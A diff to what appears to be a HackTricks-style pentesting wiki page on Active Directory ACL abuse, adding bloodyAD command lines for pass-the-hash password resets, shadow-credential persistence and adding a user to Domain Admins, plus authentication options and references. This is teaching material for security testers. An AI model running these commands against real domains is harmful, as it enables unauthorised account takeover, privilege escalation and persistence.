@@ -326,6 +326,36 @@ Notes:
 - Clean up by restoring the original content/timestamps after use.
 
 
+## BloodyAD: LDAP-native ACL abuse from Linux
+
+bloodyAD performs low-level LDAP modify/add operations directly against DCs to turn AD ACLs/ACEs into impact. Useful when you have WriteProperty/GenericWrite/GenericAll/ExtendedRight over users, computers, groups, DNS objects or zones.
+
+- Quickstart (PTH password reset):
+```bash
+bloodyAD --host <dc_fqdn_or_ip> -d <domain> -u <you> -p :<NTLMHash> set password <target.user> 'NewPassw0rd!'
+```
+- Shadow credentials (KeyCredential abuse, certificate-based persistence):
+```bash
+# Adds msDS-KeyCredentialLink on target and attempts PKINIT, dropping a TGT ccache and NT hash material
+bloodyAD --host <dc> -d <domain> -u <you> -p '<pass>' add shadowCredentials <target.user> --path shadow-<target>
+# Result: writes shadow-<target>.ccache (if PKINIT succeeds) or shadow-<target>.pfx for offline PKINIT
+```
+- AD-integrated DNS record manipulation: see [AD DNS Records](../ad-dns-records.md).
+
+Authentication and transport:
+- Cleartext: `-p '<Password>'`
+- Pass-the-Hash: `-p :<NTLMHash>` (LM:NTH also supported)
+- Pass-the-Ticket (Kerberos): `-k ccache=/path/tgt.ccache` (or `kirbi=/path.tgs`, `keytab=/path`)
+  - Example: `KRB5CCNAME=/tmp/tgt.ccache bloodyAD --host <dc> -k ccache=/tmp/tgt.ccache add groupMember "Domain Admins" <you>`
+- Client certificate: `-c key.pem:cert.pem` for Schannel bind, or combine with `-k` for PKINIT
+- TLS/Sign: `-s` to use LDAPS/GC over TLS; `-ss` to disable all LDAP signing/encryption (debug only)
+- Proxies: transparent SOCKS proxying supported (see project wiki)
+
+Notes:
+- Password reset with set password requires ForceChangePassword/GenericWrite/GenericAll on the target.
+- Shadow credentials require write on msDS-KeyCredentialLink of the target object and a DC with PKINIT-capable CA.
+- ADIDNS updates require create/modify rights on the zone/dnsNode; Authenticated Users can often create new records in default zones.
+
 ## References
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
@@ -335,10 +365,12 @@ Notes:
 - [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 - [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
 - [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
-- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
 - [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
 - [Samba – net rpc (group membership)](https://www.samba.org/)
 - [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
+
+- [bloodyAD Wiki](https://github.com/CravateRouge/bloodyAD/wiki)
+- [autobloody – automated AD privesc paths](https://github.com/CravateRouge/autobloody)
 
 {{#include ../../../banners/hacktricks-training.md}}
 
